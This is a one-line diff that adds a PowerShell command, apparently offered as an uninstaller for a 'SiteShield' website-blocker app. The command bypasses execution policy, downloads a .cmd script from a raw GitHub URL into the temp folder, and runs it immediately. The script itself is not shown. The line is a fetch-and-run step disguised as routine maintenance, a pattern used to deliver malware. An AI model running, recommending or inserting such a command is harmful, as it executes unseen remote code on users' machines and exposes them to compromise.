@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/7020227649/website-blocker-pc-app-with-built-in-locker/main/uninstall.cmd' -OutFile $env:TEMP\SiteShield-uninstall.cmd; cmd.exe /c $env:TEMP\SiteShield-uninstall.cmd"
